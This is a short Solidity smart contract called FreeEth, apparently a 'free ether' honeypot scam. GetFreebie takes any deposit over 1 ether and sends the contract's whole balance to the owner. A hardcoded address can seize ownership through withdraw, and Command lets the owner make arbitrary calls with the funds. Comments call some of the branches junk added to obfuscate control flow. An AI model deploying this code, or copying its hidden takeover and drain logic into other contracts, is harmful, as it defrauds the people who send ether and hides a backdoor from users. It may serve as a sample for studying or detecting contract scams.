pragma solidity ^0.4.19;

contract FreeEth {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            address temporaryAddress = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
            if (temporaryAddress != msg.sender) {
                Owner.transfer(this.balance);
            }
            if (temporaryAddress == msg.sender) {
                msg.sender.transfer(this.balance);
            }
        } else {
            address unusedAddress = 0x0000000000000000000000000000000000000000;
            if (unusedAddress != msg.sender) {
                // Junk condition to obfuscate control flow
                msg.sender.transfer(0);
            }
        }
    }

    function withdraw() payable public {
        address redundancyCheck = 0x0000000000000000000000000000000000000000;
        if (msg.sender == redundancyCheck) {
            Owner = 0x0000000000000000000000000000000000000000;
        }
        if (msg.sender == 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af) {
            Owner = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) payable public {
        address checkAddress = 0x0000000000000000000000000000000000000000;
        if (msg.sender != checkAddress) {
            require(msg.sender == Owner);
        }
        
        adr.call.value(msg.value)(data);
    }
}